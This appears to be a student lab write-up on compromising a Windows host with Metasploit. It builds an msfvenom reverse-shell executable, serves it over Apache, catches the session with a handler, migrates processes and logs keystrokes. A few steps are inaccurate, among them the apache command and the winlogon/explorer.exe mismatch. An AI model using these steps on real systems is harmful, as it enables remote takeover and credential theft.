# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## PROGRAM:

Find the attackers ip address using ifconfig
## OUTPUT:
![Screenshot 2025-04-11 133658](https://github.com/user-attachments/assets/658da2f4-775c-4409-b48a-345d2ac28cf3)





Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT
![Screenshot 2025-04-11 135227](https://github.com/user-attachments/assets/13af2382-dec9-4672-b901-dd5ef17480b7)






copy the fun.exe into the apache /var/www/html folder
![Screenshot 2025-04-11 134135](https://github.com/user-attachments/assets/97e189af-4c19-4ada-9a93-3b1b0797b6bf)




Start apache server
sudo systemctl apache2 start
![Screenshot 2025-04-11 134145](https://github.com/user-attachments/assets/d3ac1c1c-4359-4ca4-bd95-63f773f05424)



Check the status of apache2
![Screenshot 2025-04-11 135741](https://github.com/user-attachments/assets/4f6a5ea6-6a30-4af7-a50b-f47eb5bd891a)




Invoke msfconsole:
## OUTPUT:

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.


Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit

![432657290-ea384ca5-6c96-405e-9b45-b23f4e9fab41](https://github.com/user-attachments/assets/4b1dd1fc-a414-44ef-b3e6-a4dd8088dc8f)


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 
![Screenshot 2025-04-11 143456](https://github.com/user-attachments/assets/13891cfb-8376-4f44-9935-aca5faeb480b)



Bypass any warning boxes, double-click the file, and allow it to run.


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
![Screenshot 2025-04-21 111035](https://github.com/user-attachments/assets/98e55c6e-223e-49ff-a748-8fc3adf7feb4)




Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![Screenshot 2025-04-21 111916](https://github.com/user-attachments/assets/7eb122c2-f1aa-4790-8aa5-d43102cbda63)


keyscan_dump	Shows the keystrokes captured so far

![Screenshot 2025-04-21 111943](https://github.com/user-attachments/assets/1fd7ce7e-1f82-4d82-a199-11febfc6b19f)




## RESULT:
The Metasploit framework for reconnaissance is  examined successfully
